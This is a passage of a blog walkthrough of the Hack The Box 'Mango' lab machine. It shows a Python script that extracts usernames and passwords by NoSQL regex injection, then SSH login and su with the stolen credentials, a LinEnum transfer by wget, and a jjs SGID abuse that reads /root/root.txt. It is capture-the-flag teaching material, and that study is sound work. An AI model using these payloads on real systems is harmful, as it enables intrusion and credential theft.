style='font-size:16px;font-family:"Andale Mono";color:#868686;'>)</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> </span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>39</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;      &nbsp;&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>print</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>(</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>&#39;</span><span style='font-size:16px;font-family:"Andale Mono";color:#DFAF82;'>\r</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>&#39;</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>+</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>p1</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>,</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>flush</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>=</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>False</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>,</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>end</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>=</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>&#39;&#39;</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>)</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> </span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>40</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;      &nbsp;&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#86AFFF;'>if</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>len</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>(</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>p1</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>) &gt;=</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>4</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>:</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> </span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>41</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;        &nbsp; &nbsp;&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>x</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>=</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>re.search</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>(</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>&quot;.*\$\$$&quot;</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>,</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>p1</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>)</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D8D9A9;'># exit condition if $ (end of line) was found will exit and print the string without $</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> </span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>42</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;        &nbsp; &nbsp;&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#86AFFF;'>if</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>x</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>:</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> </span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>43</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;          &nbsp; &nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>print</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>(</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>&#39;</span><span style='font-size:16px;font-family:"Andale Mono";color:#DFAF82;'>\n\n</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>this is the string: &#39;</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>+</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>p1</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>[:</span><span style='font-size:16px;font-family:"Andale Mono";color:#FD8285;'>-2</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>])</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> </span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>44</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;          &nbsp; &nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#FD8285;'>exit</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>()</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> </span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>45</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> </span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>46</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;      &nbsp;&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>rqst</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>(</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>p1</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>)</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> </span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>47</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;  &nbsp;&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#FD8285;'>return</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> </span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>48</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> </span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>49</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> </span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>50</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>print</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>(</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>rqst</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>(</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>p1</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>))</span></p>
      </gutter></pre></figure><br></br>
     running with script python3 we get the following account name <code>admin</code> as expected

     <br></br><img src="/images/hackthebox/mango/9.png" alt=""><br></br>


     Now lets tweak the script little bit to be able to find another username.
      First thing we should add <code>, 'a'</code> in line 34 just like this 
      <code>if chr(i) in ['.','?','*','^','+','&','|','a']:</code> 
      <br></br> this way will skip letter 'a' so we can enumerate the first letter of the another target account. 
      <b>Note: </b> if you suspect that there is another account that start with 'a' but not admin. 
        you can escape letter 'd' instead of 'a' for enumeratation. 
      <br></br>
    
      running the script after tweaking it we get.
      
      <br></br><img src="/images/hackthebox/mango/10.png" alt=""><br></br>
      
    
     we see that <code>m</code> is the first letter. Now lets tweak the script another time. Will remove
     'a' from <br>line # 34 <code>if chr(i) in ['.','?','*','^','+','&','|','a']:</code> </br>
     and modify <code>data1</code> variable and add <code>m</code> as a value for <code>username=</code> parameters.
     <br></br>
     line # 25 should look like this 
     <code>
      data1 = "username[$regex]=^<a style="color:red">m</a>"+p1+"&password[$ne]=&login=login"
     </code>
and the result is: 

<br></br><img src="/images/hackthebox/mango/11.png" alt=""><br></br>

so know we have two account names <code>admin </code>and <code>mango</code>. Now with extraction of passwords.
Will tweak the script to fit our needs in this case. <br> in line#25 we will modify <code>data1</code> variable to the following:</br>
<code>data1 = "username=admin&password[$regex]=^"+p1+"&login=login"</code> 
by this modification we are injecting <code>password</code> parameter instead of username and we hardcoded the username to search for the associated password.

<br></br><img src="/images/hackthebox/mango/12.png" alt=""><br></br>

checking out the result. And a successful login.

<br></br><img src="/images/hackthebox/mango/13.png" alt=""><br></br>

running the script with <code>mango</code> hardcoded as username.

<br></br><img src="/images/hackthebox/mango/14.png" alt=""><br></br>


<h2 id="Initial Foothold & User Own"><a href="#Initial Foothold & User Own" class="headerlink" title="Initial Foothold & User Own"></a>Initial Foothold & User Own</h2>


<p>
lets try these creds to ssh in the box. <br> <code>ssh mango@10.10.10.162</code> and enter the password when prompt. <p style="color:gray">Admin account didnt have ssh login.</p>
once we are in the box as mango, will look around for juicy stuff. <br>



<figure>
  <pre>
  <gutter>
  <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#2FE71A;'>mango@mango</span><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>:</span><span style='font-size:20px;font-family:"Andale Mono";color:#4A00FF;'>~</span><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>$ cat /etc/passwd</span></p>
  <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>root:x:0:0:root:/root:/bin/bash</span></p>
  <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span></p>
  <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>bin:x:2:2:bin:/bin:/usr/sbin/nologin</span></p>
  <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>sys:x:3:3:sys:/dev:/usr/sbin/nologin</span></p>
  <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>sync:x:4:65534:sync:/bin:/bin/sync</span></p>
  <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>games:x:5:60:games:/usr/games:/usr/sbin/nologin</span></p>
  <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span></p>
  <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span></p>
  <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span></p>
  <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span></p>
  <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span></p>
  <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span></p>
  <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span></p>
  <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span></p>
  <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span></p>
  <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span></p>
  <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span></p>
  <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span></p>
  <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin</span></p>
  <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin</span></p>
  <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>syslog:x:102:106::/home/syslog:/usr/sbin/nologin</span></p>
  <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>messagebus:x:103:107::/nonexistent:/usr/sbin/nologin</span></p>
  <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>_apt:x:104:65534::/nonexistent:/usr/sbin/nologin</span></p>
  <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>lxd:x:105:65534::/var/lib/lxd/:/bin/false</span></p>
  <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin</span></p>
  <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin</span></p>
  <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin</span></p>
  <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>pollinate:x:109:1::/var/cache/pollinate:/bin/false</span></p>
  <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>sshd:x:110:65534::/run/sshd:/usr/sbin/nologin</span></p>
  <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>mango:x:1000:1000:mango:/home/mango:/bin/bash</span></p>
  <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>admin:x:4000000000:1001:,,,:/home/admin/:/bin/sh</span></p>
  <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>mongodb:x:111:65534::/home/mongodb:/usr/sbin/nologin</span></p>
  </gutter>
  </pre>
  </figure>

  Since there is <code>admin</code> username in the box. lets try <code>su - admin</code> and the creds found earlier.

  <figure>
    <pre>
    <gutter>

      <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#2FE71A;'>mango@mango</span><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>:</span><span style='font-size:20px;font-family:"Andale Mono";color:#4A00FF;'>~</span><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>$ su - admin</span></p>
      <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>Password:&nbsp;</span></p>
      <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>$ whoami</span></p>
      <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>admin</span></p>
      <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>$&nbsp;</span></p>
      <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'>&nbsp;</p>

    </gutter>
    </pre>
    </figure>

    Nice we got in with admin and it looks like admin have <code>user.txt</code> in home directory.
  <br>
    Now we should run linux enumeration script such as <code>LinEnum.sh</code> from <a>https://github.com/rebootuser/LinEnum</a> <br>
    But we have to download it in our machine first, then move the script to mango box with following commands.<br></br>
    <code>
        wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh <br>
        python3 -m http.server 80
    </code>
<br></br>
    in mango box we can use <code>wget</code> also to download it from our machine<br>
    <code>
     $ wget http://10.10.<a style="color:red">YOUR</a>.<a style="color:red">IP</a>/LinEnum.sh
     <br>
     $ chmod +x LinEnum.sh
    </code>
  
  </br> and run the script <code>./LinEnum.sh</code>

  <h2 id="Privilege Escalation"><a href="#Privilege Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation & Root Own</h2>

  Looking at the output from <code>LinEnum.sh</code> we see that there is <code>SGID</code> (<B>S</B>et <B>G</B>roup <B>ID</B>) binary named <code><a style="color:red">jjs</a></code> looks vulnerable.<br>
  Let me introduce you to a great webpage <a> https://gtfobins.github.io/</a> that makes binary exploitation much easier. Search for <code>jjs</code> and you can see many methods of how to abuse <code>SGID</code> on <code>jjs</code>.<br>
  Here is one way of doing that, will just read the <code>root.txt</code> from root home directory.
<br></br><code>
  echo 'var BufferedReader = Java.type("java.io.BufferedReader");<br>
  var FileReader = Java.type("java.io.FileReader");<br>
  var br = new BufferedReader(new FileReader("/root/root.txt"));<br>
  while ((line = br.readLine()) != null) { print(line); }' | jjs </code></br>
</br>
  lets run the above commands, and we should get <code>root.txt</code> printed out for us.
  <figure>
    <pre>
    <gutter>
      <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>$ echo &#39;var BufferedReader = Java.type(&quot;java.io.BufferedReader&quot;);</span></p>
      <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>var FileReader = Java.type(&quot;java.io.FileReader&quot;);</span></p>
      <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>var br = new BufferedReader(new FileReader(&quot;/root/root.txt&quot;));</span></p>
      <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>while ((line = br.readLine()) != null) { print(line); }&#39; | jjs&gt; &gt; &gt;&nbsp;</span></p>
      <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>Warning: The jjs tool is planned to be removed from a future JDK release</span></p>
      <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>jjs&gt; var BufferedReader = Java.type(&quot;java.io.BufferedReader&quot;);</span></p>
      <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>jjs&gt; var FileReader = Java.type(&quot;java.io.FileReader&quot;);</span></p>
      <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>jjs&gt; var br = new BufferedReader(new FileReader(&quot;/root/root.txt&quot;));</span></p>
      <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>jjs&gt; while ((line = br.readLine()) != null) { print(line); }</span></p>
      <p style='margin:0cm;margin-bottom:.0001pt;font-size:16px;font-family:"Calibri",sans-serif;'><span style='font-size:20px;font-family:"Andale Mono";color:#EAFFFF;'>****************<a style="color:red">81688424e9ab15ab15</a></span></p>
    </gutter>
    </pre>
    </figure>





<br></p>


<br>Thanks for reading.</p>
<figure class="highlight"><td class="gutter"></td>

  <!-- HERE
  copy from terminal and paste in word then copy that and paste it in https://wordtohtml.net/ to get colorful termnial

  should use 
  
  <figure class="highlight"><td class="gutter"></td>
    
here is the coppying


</td>
</figure>
  -->

</td>
</figure>
</div>


  <div class="book-comments">
    




  </div>



<script src="/js//book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <div class="author-title">
      <div>Abdullah Alshubaili</div>
      <div> </div>
    </div>
  </div>

  <!--
        <div class="divider"></div>
    
    <div class="link">
      <a class="tag-link" href="/tags/linux/" rel="tag">#linux</a>
    </div>
    
  -->

  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">

  <a onclick="go_top()">Back to top</a>

</div>


<script src="/js//book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js//book.js"></script>
